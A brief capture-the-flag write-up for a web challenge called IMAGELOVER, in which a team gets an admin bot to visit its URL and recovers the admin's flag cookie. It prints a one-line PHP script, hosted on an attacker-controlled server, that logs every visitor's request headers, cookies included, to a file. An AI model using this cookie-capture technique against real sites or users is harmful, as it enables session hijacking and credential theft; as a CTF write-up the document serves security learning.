## IMAGELOVER - 70 PTS
* The challenge asked us to provide a url which the admin would be visiting carrying along with him the flag.
* We tried to include some simple script tags in the url but it didn't accept them. Then, we tried some simple urls other than image and it worked.
* So, we hosted a php script online `<?php $fh = fopen('ans.txt', 'a'); fwrite($fh, print_r($_SERVER,true)); fclose($fh); ?>` which saved the contents of `$_SERVER` in a file in order to look for cookies.
* And when we opened the `ans.txt` file, we had 
`Array (
...
[HTTP_COOKIE] => flag=----------------------------
...
)`